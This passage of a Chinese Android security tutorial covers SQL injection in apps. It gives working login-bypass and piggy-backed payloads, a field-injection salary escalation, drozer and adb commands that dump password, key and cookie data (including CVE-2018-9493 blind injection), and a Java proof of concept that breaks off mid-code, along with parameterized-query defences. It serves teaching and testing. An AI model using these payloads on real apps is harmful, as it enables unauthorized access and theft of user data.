&#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure><p>这样会是的我们将查询语句构造成上面语句，APP就不会去验证密码，而我们又输入的是管理员账号，所以可以尝试进行sql注入绕过</p><p>构造账号和密钥：账号<code>Admin&#39; --</code> 密钥：<code>Anything</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/5.png" alt="image-20220710154643896"></p><p>这样就成功的绕过了验证，获得具体信息</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/6.png" alt="image-20220710154806710"></p><p>我们还可以查询账号密钥相应的详细</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/7.png" alt="image-20220710154852745"></p><p>同理我们使用（1&#x3D;1）方式来进行注入</p><p><code>1=1</code></p><p>我们使用<code>1=1</code>来进行注入，无非是相在输入账户情况下，可以输入任意的密码，这样我们只需要使用(OR <code>&#39;1&#39;=&#39;1&#39;</code>)即可</p><p>可以构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>构造账号和密钥：账号：<code>Admin&#39; OR &#39;1&#39;=&#39;1</code> 密钥：<code>anything&#39; OR &#39;1&#39;=&#39;1</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/8.png" alt="image-20220710155537289"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/9.png" alt="image-20220710155557758"></p><p>同理成功进入 上面账号和密码可以为任意值</p><h3 id="2-Piggy-backed查询"><a href="#2-Piggy-backed查询" class="headerlink" title="2.Piggy-backed查询"></a>2.Piggy-backed查询</h3><h4 id="（1）漏洞原理-1"><a href="#（1）漏洞原理-1" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们上面已经简单的绕过了该攻击，我们可以使用<code>;</code>来进行Piggy-backed查询，这样可以使得在登录系统的同时，再进行执行一条SQL语句</p><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们可以构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;anyname&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee (NAME, ID) <span class="keyword">VALUES</span> (<span class="string">&#x27;MUR&#x27;</span>,<span class="string">&#x27;11451&#x27;</span>) <span class="comment">-- AND PASSWORD = &#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure><p>上面的语句实现三个功能：构造任意的用户名，插入新的sql语句，使得验证码无效</p><p>构造用户名和密码：用户名：<code>anyname&#39; OR &#39;1&#39;=&#39;1&#39;; INSERT INTO employee (NAME, ID) VALUES (&#39;MUR&#39;,&#39;11451&#39;) --</code> 密码：<code>anything</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/10.png" alt="image-20220710161338483"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/11.png" alt="image-20220710161653071"></p><p>这里我们发现成功的登录，但是并没有插入用户名成功，经过分析，在大多数<a href="https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#execSQL(java.lang.String)">SQLiteDatabase API</a>中<code>;</code>被定义为终止，所以它之后的任何内容都应该被忽略，但是这也是在一些APP中可以进行测试的环节，当我们理解<code>;</code>作用后，很明显我们又可以得到一种绕过登录的方法，这里既然<code>;</code>后面都无效，是不是意味，我们只要输入正确账户，就可以登录</p><p>构造SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>;  <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure><p>构造账号和密码：账号<code>Admin&#39;;</code>，密码：<code>Anything</code> </p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/12.png" alt="image-20220710162127368"></p><p>同样成功登录</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/13.png" alt="image-20220710162156625"></p><h3 id="3-逻辑错误攻击"><a href="#3-逻辑错误攻击" class="headerlink" title="3.逻辑错误攻击"></a>3.逻辑错误攻击</h3><h4 id="（1）漏洞原理-2"><a href="#（1）漏洞原理-2" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>原本逻辑错误攻击是利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。而我们这里发现在数据字段校验时，通过插入多余的字段，来实现越权的功能</p><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>这里我们分析到数据库更新的语句</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/14.png" alt="image-20220710163213985"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/15.png" alt="image-20220710163233575"></p><p>通过这里的更新语句我们可以很明显的得到构造的SQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;...&#x27;</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> (...)</span><br></pre></td></tr></table></figure><p>这里我们模拟一般的管理系统，很显然只能管理员对员工的一些信息进行修改，比如薪资，而员工只能修改一般的字段，我们这里通过普通用户模式登陆</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/16.png" alt="image-20220710163736745"></p><p>可以很明显发现，这里的薪资是无法进行修改的，那我们通过添加字段利用逻辑错误来实现修改</p><p>构造SQL:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="string">&#x27;100000000&#x27;</span> </span><br><span class="line"><span class="keyword">WHERE</span> ID <span class="operator">=</span> (Alice.id)</span><br></pre></td></tr></table></figure><p>我们这里修改Phone的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=&#x27;</span><span class="number">100000000</span></span><br></pre></td></tr></table></figure><p>这样就多加了一个字段，但是我们对上面代码逻辑进行分析，发现只是对字符串进行读取，并未校验</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/17.png" alt="image-20220710164102899"></p><p>点击更新</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/18.png" alt="image-20220710164124887"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/19.png" alt="image-20220710164202529"></p><p>再次进入我们就发现薪资变为了我们预设的数字</p><p>当然利用上面的实现我们还能修改用户名，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="number">100000000</span></span><br><span class="line"><span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="string">&#x27;Boby&#x27;</span> <span class="comment">-- &#x27; WHERE ID = (Alice.id)</span></span><br></pre></td></tr></table></figure><p>我们构造语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=10000000 WHERE NAME=&#x27;</span>Bobby<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/20.png" alt="image-20220710165113539"></p><p>更新成功后，我们进入Bobby的信息，发现就被修改了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/21.png" alt="image-20220710165227929"></p><h3 id="4-漏洞的挖掘思路"><a href="#4-漏洞的挖掘思路" class="headerlink" title="4.漏洞的挖掘思路"></a>4.漏洞的挖掘思路</h3><p>我们前面讲了三种常见类型的SQL注入的案例，但是我们在实际挖掘过程中，怎么初步的判断是否存在这类漏洞，并进行使用</p><p>我们打开另外一个样本APK</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/25.png" alt="image-20220710171128029"></p><p>我们知道并不是所有APK样本，我们都能很轻易的获得源码，有些可能使用了加壳服务，但是测试上述的漏洞很容易</p><p>我们都知道SQL注入需要单引号配对，我们可以根据日志和错误提示来查看</p><p>首先我们先进行日志监听或使用ddms</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep packagename</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/26.png" alt="image-20220710171544841"></p><p>然后我们输入一个单引号<code>&#39;</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/27.png" alt="image-20220710171759976"></p><p>很明显说明这里是存在SQL注入，说明程序是有从Sqlite中获取信息，但由于我们输入<code>&#39;</code>引号，没有配对，导致程序错误</p><p>然后我们再输入双引号<code>&#39;&#39;</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/28.png" alt="image-20220710172000010"></p><p>程序正在搜索输入的数据，没有产生SQL错误。为了进一步确认，我们再加一个单引号，看看是否会引发SQL错误</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/29.png" alt="image-20220710172107288"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/30.png" alt="image-20220710172135897"></p><p>程序再次报错，说明奇数个<code>&#39;</code>会导致SQL错误，当引号刚好匹配时SQL查询正好会执行</p><p>然后我们就可以使用我们上面的漏洞来进行测试，我们使用一个万能语句，即无论正确错误都输入的语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; !=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>无论是ture还是flase我们都满足，即万能语句</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/31.png" alt="image-20220710172419976"></p><p>这里我们就成功的爆出了相关信息</p><p>这里很显然是app接收了用户的输入，没有经过验证就直接加入到SQL查询语句</p><h3 id="5-安全防护"><a href="#5-安全防护" class="headerlink" title="5.安全防护"></a>5.安全防护</h3><p>针对1-3的漏洞现象，样本中依次进行了安全防护</p><p><strong>针对1-2的防护：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/22.png" alt="image-20220710165651424"></p><p>上图中2表示防护的代码</p><p><strong>针对3的防护：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/23.png" alt="image-20220710165822151"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/24.png" alt="image-20220710165913808"></p><p>我们可以发现上传的防护方式，都使用了<code>?</code>, 问号<code>?</code>是 SQL 查询中的参数持有者，将使用 String ListArray 中给出的相应参数进行编译，即会对输入的参数进行转义和绑定，这样就可以有效的进行参数输入防护</p><h2 id="四、Content-Provider上Sql注入漏洞"><a href="#四、Content-Provider上Sql注入漏洞" class="headerlink" title="四、Content Provider上Sql注入漏洞"></a>四、Content Provider上Sql注入漏洞</h2><p>我在<a href="https://bbs.pediy.com/thread-269447.htm">Android APP漏洞之战（4）——Content漏洞详解</a>已经初步介绍了Content Provider中存在的sql注入漏洞，我们知道Android中provider提供不同进程之间共享内容，而content在查询的过程中也会存在一些典型的Sql注入漏洞</p><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>Content Provider SQL注入漏洞产生的因如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content Provider组件是可导出的未校验输入值是否符舍规范，就作为SQL语句的一部分，例如：</span><br><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;123&#x27;or&#x27;1=1&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=&#x27;&quot;</span>+inputUserName +<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>+inputPassword+<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql);</span><br><span class="line">以上两点均满足的情况下，就会产生SQL注入风险</span><br></pre></td></tr></table></figure><h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>我们挖掘Content Provider漏洞的步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）扫描全局代码，是否存在导出的Content Provider组件</span><br><span class="line">（2）若存在导出的Content Provider组件，则判断SQL语句中是否有未校验的输入值，若存在则存在风险。</span><br><span class="line">（3）汇总结果</span><br></pre></td></tr></table></figure><h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>我们使用drozer扫描注入的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/32.png" alt="image-20220710165913808"></p><p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/33.png" alt="image-20220710165913808"></p><p>列出所有表信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/34.png" alt="image-20220710165913808"></p><p>获取具体表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/35.png" alt="image-20220710165913808"></p><p>列出该app的表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/36.png" alt="image-20220710165913808"></p><h3 id="4-安全防护"><a href="#4-安全防护" class="headerlink" title="4.安全防护"></a>4.安全防护</h3><p>（1）不需要导出的Content Provider组件，建议显示设置组件的“android:exported”属性为false</p><p>（2）当组件可导出时，建议使用selectionArgs进行参数化组成SQL语句，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=? and password=?&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;username,password&#125;);</span><br></pre></td></tr></table></figure><p>我们可以发现Content Provider上的sql漏洞核心原理和上面是一样的</p><h2 id="五、Android-Download-Provider上sql注入漏洞"><a href="#五、Android-Download-Provider上sql注入漏洞" class="headerlink" title="五、Android Download Provider上sql注入漏洞"></a>五、Android Download Provider上sql注入漏洞</h2><p>Android Download Provider是用来进行下载的一个重要组件，Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。</p><p>下载的流程关系图：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/38.png" alt="image-20220710193502503"></p><h3 id="1-CVE-2018-9493-Download-Provider-SQL注入"><a href="#1-CVE-2018-9493-Download-Provider-SQL注入" class="headerlink" title="1.CVE-2018-9493: Download Provider SQL注入"></a>1.CVE-2018-9493: Download Provider SQL注入</h3><h4 id="（1）漏洞原理-3"><a href="#（1）漏洞原理-3" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>通过利用SQL注入漏洞，未授予任何权限的恶意应用程序可以绕过当前实现的所有访问控制机制，从下载提供程序检索所有条目。 此外，被授予有限权限的应用程序（如Internet）也可以从不同的URI访问所有数据库内容。 对于Gmail、Chrome或Google Play Store等应用程序，从该提供程序检索的信息可能包括潜在的敏感信息，如文件名、描述、标题、路径、URL（在查询字符串中可能包含敏感参数）等。</p><p>然而内部数据库中的某些列（例如<code>CookieData</code>）被认为是私有的，不能通过 Download Content Provider 直接访问，除非调用者具有不受限制的权限（URI 受<code>signatureOrSystem</code>访问级别保护）</p><p>利用 where 表达式中的 SQL 注入，绕过<code>setStrict</code>过滤器，将允许我们从内部数据库中提取内容，包括任何受限制的列下载</p><p>访问下载内容提供程序需要不同的权限，例如Internet或access_all_downloads，这取决于所请求的URI</p><p>例如：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/37.png" alt="image-20220710193502503"></p><p>但是可以针对下面URL，则无需任何权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br></pre></td></tr></table></figure><p>我们可以在源码中查看对该URI的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sURIMatcher.addURI(<span class="string">&quot;downloads&quot;</span>,</span><br><span class="line">   Downloads.Impl.PUBLICLY_ACCESSIBLE_DOWNLOADS_URI_SEGMENT + <span class="string">&quot;/#&quot;</span>,</span><br><span class="line">   PUBLIC_DOWNLOAD_ID);</span><br></pre></td></tr></table></figure><p>可以看出该URI，可以用于公共下载，但没有什么可以阻止攻击者注入SQL Selection子句来访问数据库中的任何行、列或表，包括受保护的列。这样我们就可以进行SQL注入</p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不需要权限：</span><br><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br><span class="line">需要权限android.permission.INTERNET：</span><br><span class="line">content:<span class="comment">//downloads/my_downloads/</span></span><br><span class="line">content:<span class="comment">//downloads/my_downloads/#</span></span><br><span class="line">content:<span class="comment">//downloads/download/</span></span><br><span class="line">content:<span class="comment">//downloads/download/#</span></span><br></pre></td></tr></table></figure><p>因此我们可以构造相关的sql注入语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>这里需要从Google Chrome下载任何文件（即PDF文件）或从Gmail下载任何附件，确保提供程序包含一些数据，然后使用该语句</p><p>由于底层SQLiteQueryBuilder中强制使用严格模式，无法实现基于UNION语句的直接注入，但可以通过利用盲SQL注入提取所有信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (_id=1 AND cookiedata LIKE &#x27;a%&#x27;) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>也可以从request_headers表转储所有内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (SELECT header FROM request_headers WHERE _id=1) LIKE &#x27;a%&#x27; OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>还可以使用盲SQL注入（如果启用此选项，则过程将稍微慢一些）来包含受限列，如UID、ETAG或CookieData</p><h4 id="（2）漏洞复现-3"><a href="#（2）漏洞复现-3" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>首先我们需要从google上下载一些数据</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/39.png" alt="image-20220710194802806"></p><p>这里没有合适的案例，就不进行演示了</p><p>然后我们编写Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dump</span><span class="params">(<span class="type">boolean</span> dumpProtectedColumns)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/#&quot;</span>);</span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable1&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//这里可以替换我们的sql注入构造语句</span></span><br><span class="line">           cur = res.query(uri, <span class="literal">null</span>, <span class="string">&quot;1=1) OR (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>, <span class="string">&quot;Error&quot;</span>, e);</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable&quot;</span>);</span><br><span class="line">           <span class="comment">//return;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span> || cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">// Iterate all results and display some fields for each row from the downloads database</span></span><br><span class="line">               <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">rowId</span> <span class="operator">=</span> cur.getInt(cur.getColumnIndex(<span class="string">&quot;_id&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowData</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;_data&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowUri</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowTitle</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;title&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowDescription</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;description&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                   <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(string);</span><br><span class="line">                   sb.append(<span class="string">&quot;DOWNLOAD ID &quot;</span>).append(rowId);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nData: &quot;</span>).append(rowData);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nUri: &quot;</span>).append(rowUri);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nTitle: &quot;</span>).append(rowTitle);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nDescription: 